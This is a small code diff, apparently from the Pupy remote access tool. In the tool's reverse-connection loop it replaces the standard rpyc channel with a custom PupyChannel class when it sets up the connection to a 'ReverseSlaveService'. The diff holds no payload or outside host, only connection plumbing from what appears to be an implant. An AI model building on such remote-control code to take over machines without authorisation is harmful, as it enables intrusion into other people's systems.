@@ -59,6 +59,7 @@ import argparse
 from network import conf
 from network.lib.base_launcher import LauncherError
 from network.lib.connection import PupyConnection
+from network.lib.streams.PupySocketStream import PupyChannel
 import logging
 import shlex
 import marshal
@@ -400,7 +401,7 @@ def rpyc_loop(launcher):
                 try:
                     conn = PupyConnection(
                         lock, None, ReverseSlaveService,
-                        rpyc.Channel(stream), config={}
+                        PupyChannel(stream), config={}
                     )
                     conn._init_service()
                 finally:
